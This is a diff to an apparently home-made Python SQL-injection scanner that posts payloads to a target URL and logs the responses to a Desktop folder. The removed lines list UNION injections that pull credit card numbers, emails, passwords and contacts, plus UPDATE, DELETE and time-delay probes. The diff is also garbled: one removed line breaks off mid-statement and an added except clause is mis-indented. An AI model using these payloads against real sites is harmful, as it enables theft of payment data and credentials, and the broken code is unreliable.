@@ -4,6 +4,8 @@ import requests
 from requests.exceptions import RequestException, SSLError
 from datetime import datetime
 
+file_count = 1  # Initialize file_count globally
+
 def run_command(command):
     """Run a command and return its output."""
     result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
@@ -107,31 +109,6 @@ def perform_sql_injection(target_url, results_dir):
     ]
     
     file_count = 1  # Initialize file_count for this function
-
-    for payload in payload
-def perform_sql_injection(target_url, results_dir):
-    """Perform SQL Injection using the provided payloads."""
-    global file_count  # Declare file_count as global
-    payloads = [
-        "' OR 1=1 UNION SELECT cc_number, cc_holder, cc_expiration FROM credit_cards --",
-        "' OR 1=1 UNION SELECT email FROM users --",
-        "' OR 1=1 UNION SELECT password FROM users --",
-        "' OR 1=1 UNION SELECT contact_name, contact_number FROM contacts --",
-        "SELECT * FROM users WHERE username='admin';",
-        "INSERT INTO users (username, password) VALUES ('newuser', 'newpassword');",
-        "UPDATE users SET password='newpassword' WHERE username='admin';",
-        "DELETE FROM users WHERE username='olduser';",
-        "SELECT * FROM products WHERE name LIKE '%user_input%';",
-        "SELECT * FROM products WHERE name LIKE '%admin%' UNION SELECT username, password FROM users;",
-        "SELECT * FROM users WHERE username='user_input' AND password='password_input';",
-        "SELECT * FROM users WHERE username='admin' AND password=' OR 1=1 -- ';",
-        "SELECT * FROM products WHERE name LIKE '%user_input%';",
-        "SELECT * FROM products WHERE name LIKE '%admin%' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1;",
-        "SELECT * FROM products WHERE name LIKE '%user_input%';",
-        "SELECT * FROM products WHERE name LIKE '%admin%' AND SLEEP(5);"
-    ]
-    
-    file_count = 1  # Initialize file_count for this function
     
     for payload in payloads:
         data = {
@@ -146,19 +123,36 @@ def perform_sql_injection(target_url, results_dir):
                 file.write(f"Payload: {payload}\n")
                 file.write(f"Response: {response.text}\n")
             print(f"Saved SQL Injection results to {output_file}")
+            file_count += 1         
+            except SSLError as e:
+            output_file = os.path.join(results_dir, f'sql_injection_{file_count}.txt')
+            with open(output_file, 'w') as file:
+                file.write(f"Payload: {payload}\n")
+                file.write(f"SSL Error: {e}\n")
+            print(f"Saved SQL Injection error to {output_file}")
             file_count += 1
-        except SSLError as e:
-            print(f"SSL Error: {e}")
         except RequestException as e:
-            print(f"Request Error: {e}")
+            output_file = os.path.join(results_dir, f'sql_injection_{file_count}.txt')
+            with open(output_file, 'w') as file:
+                file.write(f"Payload: {payload}\n")
+                file.write(f"Request Error: {e}\n")
+            print(f"Saved SQL Injection error to {output_file}")
+            file_count += 1
+
+def create_results_directory():
+    """Create a directory for saving results on the Desktop."""
+    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+    results_dir = os.path.join(desktop_path, "Inculator_Results_" + datetime.now().strftime("%Y%m%d_%H%M%S"))
+    
+    if not os.path.exists(results_dir):
+        os.makedirs(results_dir)
+    
+    return results_dir
 
 def main():
-    # Create results directory on the Desktop
-    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
-    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    results_dir = os.path.join(desktop_path, f"Inculator_{timestamp}")
-    os.makedirs(results_dir, exist_ok=True)
-    
+    # Create results directory on Desktop
+    results_dir = create_results_directory()
+
     # Print the header
     print_header()
 
@@ -172,7 +166,7 @@ def main():
         perform_sql_injection(target_url, results_dir)
         
         # Save results to a file
-        results_file = os.path.join(results_dir, 'results.txt')
+        results_file = os.path.join(results_dir, 'scan_results.txt')
         print(f"Saving results to {results_file}...")
         save_to_file(results_file, "SQL Injection test results:")
         save_to_file(results_file, f"Target URL: {target_url}")
@@ -213,11 +207,15 @@ def main():
             save_to_file(results_file, "Subfinder errors:")
             save_to_file(results_file, stderr)
         
-        # Final message
-        print(f"All results have been saved to {results_dir}")
-        print("Scan completed by Haggar")
+        # Append a message indicating the end of the scan
+        with open(results_file, 'a') as file:
+            file.write("\nScan completed by Haggar\n")
+        
+        print(f"All results have been saved to {results_file}")
 
 if __name__ == "__main__":
     install_tools()
     clear_screen()
     main()
+    
+       
